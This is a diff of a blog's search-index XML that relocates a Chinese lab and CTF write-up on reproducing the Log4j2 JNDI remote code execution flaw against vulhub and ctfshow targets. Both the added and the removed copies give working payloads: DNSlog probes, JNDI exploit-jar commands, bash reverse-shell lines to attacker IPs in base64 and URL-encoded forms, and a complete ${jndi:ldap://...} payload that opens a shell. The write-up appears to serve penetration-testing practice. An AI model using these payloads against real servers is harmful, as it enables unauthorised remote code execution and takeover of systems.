@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>复现log4j2</title>
+      <link href="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/"/>
+      <url>/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/</url>
+      
+        <content type="html"><![CDATA[<h1>Log4j2远程代码执行漏洞复现</h1><h1>漏洞描述</h1><blockquote><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p></blockquote><h2 id="简介">简介</h2><blockquote><p>log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目 标服务器上执行任意代码。</p></blockquote><h2 id="漏洞范围"><strong>漏洞范围</strong></h2><p>影响组件应用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare<br></code></pre></td></tr></table></figure><h2 id="受影响版本"><strong>受影响版本</strong></h2><p>Apache Log4j 2.x ~ 2.15.0-rc1</p><h2 id="复现环境">复现环境</h2><p>Vulhub 搭建log4j漏洞环境</p><h2 id="环境搭建">环境搭建</h2><p>1.vulhub靶场下载地址: <a href="https://vulhub.org/#/docs/">https://vulhub.org/#/docs/</a><br>2.使用docker搭建vulfocus的漏洞靶场</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">docker pull vulfocus/log4j2-rce-2021-12-09:latest<br>docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">8080</span> vulfocus/log4j2-rce-2021-12-09:latest<br></code></pre></td></tr></table></figure><p>![image-20230131202745343](复现 log4j2/image-20230131202745343.png)</p><p>3.访问漏洞环境，环境搭建完成。</p><p>![image-20230131202917476](复现 log4j2/image-20230131202917476.png)</p><h2 id="漏洞复现">漏洞复现</h2><h3 id="检查漏洞是否存在">检查漏洞是否存在</h3><p>进入我们需要复现的漏洞靶场文件夹下,输入命令 : docker-compose up -d</p><p>![image-20230131205129179](复现 log4j2/image-20230131205129179.png)</p><h4 id="利用DNSlog验证漏洞存在">利用DNSlog验证漏洞存在</h4><p>靶场启动成功后，浏览器访问:<br><a href="http://xn--DNSLogvrlxt9-r65tt8pelaqpj05c721a571mlo0b1ob.dnslog.cn">通过DNSLog平台获取到域名vrlxt9.dnslog.cn</a>，构造payload：${jndi:ldap://vrlxt9.dnslog.cn}，浏览器点击???并使用Burpsuite进行抓包并替换payload参数，此时若直接发包会导致服务器400错误:<br>![image-20230131205703682](复现 log4j2/image-20230131205703682.png)</p><p>![image-20230131210121403](复现 log4j2/image-20230131210121403.png)</p><p>![image-20230131210338396](复现 log4j2/image-20230131210338396.png)</p><p>编码后再次发送请求包：</p><p>![image-20230131210747768](复现 log4j2/image-20230131210747768.png)</p><p>在DNSLog网站成功接收到解析记录</p><h3 id="漏洞利用">漏洞利用</h3><p>这里选用JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar<br>下载JNDI注入工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，下载地址为https://github.com/bkfish/Apache-Log4j-Learning/tree/main<br>应用工具JNDI-Injection-Exploit搭建服务：格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”<br></code></pre></td></tr></table></figure><p>这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。<br>接下来要实现反弹shell，可以用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>注意“命令”必须经过编码，不然将无法实现</p><h4 id="反弹shell漏洞利用">反弹shell漏洞利用</h4><p>在漏洞已经存在的情况下，构造攻击payload执行命令反弹shell</p><p>![image-20230201144258246](复现 log4j2/image-20230201144258246.png)</p><h4 id="设置监听端口"><strong>设置监听端口</strong></h4><p>在vps中打开一个页面，监听我们的对应的端口。</p><p>![](复现 log4j2/image-20230201145109550.png)</p><h4 id="执行EXP，生成可用的payload"><strong>执行EXP，生成可用的payload</strong></h4><p>编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;” -A 192.168.254.129<br></code></pre></td></tr></table></figure><p><strong>使用burpsuit抓包，替换payload</strong>rmi://xxxx/xz4mwn 到Burpsuite：</p><p>将payload进行url编码并发包</p><p>![image-20230213083431740](复现 log4j2/image-20230213083431740.png)</p><p>攻击成功，即为反弹shell成功</p><p>![image-20230213083409641](复现 log4j2/image-20230213083409641.png)</p><h2 id="ctfshow靶场">ctfshow靶场</h2><p>![image-20230227084751508](复现 log4j2/image-20230227084751508.png)</p><p>![image-20230227084957676](复现 log4j2/image-20230227084957676.png)</p><h3 id="check">check</h3><p>首先测试下漏洞是否存在，可以利用dnslog平台检测漏洞是否存在</p><p><a href="http://xn--dnslog-oy7ry56d.cn">访问dnslog.cn</a></p><p>![image-20230227123916565](复现 log4j2/image-20230227123916565.png)</p><p>输入检测payload</p><p>${jndi:ldap://1m2ux1.dnslog.cn}</p><p>![image-20230227124228459](复现 log4j2/image-20230227124228459.png)</p><p>发现一条访问记录，说明漏洞存在</p><p>![img](复现 log4j2/3040181-20221118132302804-1532498878.png)</p><h3 id="漏洞利用-2">漏洞利用</h3><p>下载jar包 JNDIExploit-1.2-SNAPSHOT.jar</p><p>这个jar包拥有很多JNDI注入payload，能够将自己的服务器仿造成ldap服务器</p><p>启动jar包，利用nc反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs SHELL">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip -p 2333<br></code></pre></td></tr></table></figure><p>![image-20230227124448557](复现 log4j2/image-20230227124448557.png)</p><p>再开一个终端，开启nc监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -lvp 1099<br></code></pre></td></tr></table></figure><p>![image-20230227124545252](复现 log4j2/image-20230227124545252.png)</p><p>制作poc，通过bash -i &gt;&amp; /dev/tcp/x.x.x.x/1099 0&gt;&amp;1反弹shell</p><p>bash -i &gt;&amp; /dev/tcp/120.77.151.110/1099 0&gt;&amp;1</p><p>说明：</p><blockquote><p>bash -i 指开启一个交互式的Shell</p><p>&amp;符号用于区分文件和文件描述符</p><p>&amp;表示标准输出或标准错误输出重定向到文件</p><p>0指标准输入重定向，1指标准输出重定向，2指错误输出重定向</p><p>/dev/tcp指linux下的特殊设备，可用于建立Socket连接</p><p>bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1  指将标准输出重定向到/dev/tcp/ip/port端口文件中即重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，所以可以看到攻击机输入命令并看到结果。</p></blockquote><p>POC为：</p><p>bash -i &gt;&amp; /dev/tcp/120.77.151.110/10001 0&gt;&amp;1</p><p>base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx</p><p>Url编码后：</p><p>YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$&#123;jndi:ldap://120.77.151.110:1389/TomcatBypass/Command/Base64//YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx&#125;<br></code></pre></td></tr></table></figure><p>将payload注入后shell会被反彈到nc监听的端口上</p><p>拿到shell后cd到根目录ls看到flag</p><p>cat之即可拿到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>buuctf</title>
       <link href="/2023/02/27/buuctf/"/>
       <url>/2023/02/27/buuctf/</url>
@@ -94,31 +119,6 @@
             <tag> 渗透 </tag>
             
             <tag> 命令 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>复现log4j2</title>
-      <link href="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/"/>
-      <url>/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/</url>
-      
-        <content type="html"><![CDATA[<h1>Log4j2远程代码执行漏洞复现</h1><h1>漏洞描述</h1><blockquote><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p></blockquote><h2 id="简介">简介</h2><blockquote><p>log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目 标服务器上执行任意代码。</p></blockquote><h2 id="漏洞范围"><strong>漏洞范围</strong></h2><p>影响组件应用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare<br></code></pre></td></tr></table></figure><h2 id="受影响版本"><strong>受影响版本</strong></h2><p>Apache Log4j 2.x ~ 2.15.0-rc1</p><h2 id="复现环境">复现环境</h2><p>Vulhub 搭建log4j漏洞环境</p><h2 id="环境搭建">环境搭建</h2><p>1.vulhub靶场下载地址: <a href="https://vulhub.org/#/docs/">https://vulhub.org/#/docs/</a><br>2.使用docker搭建vulfocus的漏洞靶场</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">docker pull vulfocus/log4j2-rce-2021-12-09:latest<br>docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">8080</span> vulfocus/log4j2-rce-2021-12-09:latest<br></code></pre></td></tr></table></figure><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131202745343.png" alt="image-20230131202745343"></p><p>3.访问漏洞环境，环境搭建完成。</p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131202917476.png" alt="image-20230131202917476"></p><h2 id="漏洞复现">漏洞复现</h2><h3 id="检查漏洞是否存在">检查漏洞是否存在</h3><p>进入我们需要复现的漏洞靶场文件夹下,输入命令 : docker-compose up -d</p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131205129179.png" alt="image-20230131205129179"></p><h4 id="利用DNSlog验证漏洞存在">利用DNSlog验证漏洞存在</h4><p>靶场启动成功后，浏览器访问:<br><a href="http://xn--DNSLogvrlxt9-r65tt8pelaqpj05c721a571mlo0b1ob.dnslog.cn">通过DNSLog平台获取到域名vrlxt9.dnslog.cn</a>，构造payload：${jndi:ldap://vrlxt9.dnslog.cn}，浏览器点击???并使用Burpsuite进行抓包并替换payload参数，此时若直接发包会导致服务器400错误:<br><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131205703682.png" alt="image-20230131205703682"></p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210121403.png" alt="image-20230131210121403"></p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210338396.png" alt="image-20230131210338396"></p><p>编码后再次发送请求包：</p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210747768.png" alt="image-20230131210747768"></p><p>在DNSLog网站成功接收到解析记录</p><h3 id="漏洞利用">漏洞利用</h3><p>这里选用JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar<br>下载JNDI注入工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，下载地址为https://github.com/bkfish/Apache-Log4j-Learning/tree/main<br>应用工具JNDI-Injection-Exploit搭建服务：格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”<br></code></pre></td></tr></table></figure><p>这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。<br>接下来要实现反弹shell，可以用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>注意“命令”必须经过编码，不然将无法实现</p><h4 id="反弹shell漏洞利用">反弹shell漏洞利用</h4><p>在漏洞已经存在的情况下，构造攻击payload执行命令反弹shell</p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230201144258246.png" alt="image-20230201144258246"></p><h4 id="设置监听端口"><strong>设置监听端口</strong></h4><p>在vps中打开一个页面，监听我们的对应的端口。</p><p><img src="/2023/02/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230201145109550.png" alt></p><h4 id="执行EXP，生成可用的payload"><strong>执行EXP，生成可用的payload</strong></h4><p>编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;” -A 192.168.254.129<br></code></pre></td></tr></table></figure><p><strong>使用burpsuit抓包，替换payload</strong>rmi://xxxx/xz4mwn 到Burpsuite：</p><p>将payload进行url编码并发包</p><p>攻击成功，即为反弹shell成功</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 复现 </tag>
             
         </tags>
       
